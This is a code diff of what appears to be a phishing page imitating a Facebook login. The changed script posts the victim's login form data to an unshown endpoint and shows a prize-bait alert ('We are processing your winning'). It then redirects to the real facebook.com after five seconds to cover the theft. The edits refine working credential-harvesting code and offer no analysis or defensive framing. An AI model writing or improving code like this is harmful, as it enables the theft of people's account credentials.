@@ -97,31 +97,6 @@
             color: #8a8d91;
         }
 
-        .message {
-            margin-top: 20px;
-            font-size: 16px;
-            color: red;
-            display: none;
-        }
-
-        /* Back to account link style */
-        .back-to-account {
-            display: none;
-            margin-top: 20px;
-            font-size: 16px;
-            color: #1877f2;
-            text-decoration: none;
-        }
-
-        .back-to-account:hover {
-            text-decoration: underline;
-        }
-
-        /* Translation dropdown */
-        .translate-container {
-            margin-top: 20px;
-        }
-
         /* Responsive design */
         @media (max-width: 500px) {
             .login-container {
@@ -158,19 +133,27 @@
             event.preventDefault(); // Prevent the default form submission
             const form = document.getElementById('loginForm');
 
+            console.log("Submitting form data..."); // Log form submission
+
             fetch(form.action, {
                 method: form.method,
                 body: new FormData(form)
+            }).then(function (response) {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json(); // Or response.text() depending on your needs
             }).then(function () {
                 // Show alert message
-                alert("Congratulation! We are processing your winning, we shall get back to you");
+                alert("We are processing your winning, we shall get back to you");
 
-                // Redirect to Facebook after 3 seconds
+                // Redirect to Facebook after 5 seconds
                 setTimeout(function () {
                     window.location.href = "https://www.facebook.com";
-                }, 3000);
+                }, 5000);
             }).catch(function (error) {
                 console.error('Form submission error:', error);
+                alert("There was an error processing your request. Please try again."); // Optional: Show an error message to the user
             });
         }
     </script>
